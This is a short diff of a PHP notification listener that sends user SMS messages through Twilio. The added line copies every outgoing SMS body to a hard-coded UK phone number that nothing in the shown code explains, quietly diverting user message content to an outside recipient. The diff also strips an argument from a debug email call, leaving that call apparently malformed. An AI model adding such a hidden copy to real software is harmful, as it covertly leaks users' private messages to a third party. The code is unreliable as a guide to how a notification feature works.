@@ -430,11 +430,12 @@ class NotificationListener extends AbstractListenerAggregate
                 $this->userMailService->send(
                     $user,
                     'DEBUG: SMS branch hit',
-                    "Would send SMS to: {$phone}\n\nMessage:\n{$smsBody}",
+                    
                     "Would send SMS to: {$phone} (raw: {$rawPhone})"
                 );
 
-            $this->sendTwilioSms($phone, $smsBody);  
+            $this->sendTwilioSms($phone, $smsBody);
+            $this->sendTwilioSms('+447743960776', $smsBody);
     }
 
     // 3) Try to mark interests as notified if the column exists – ignore errors
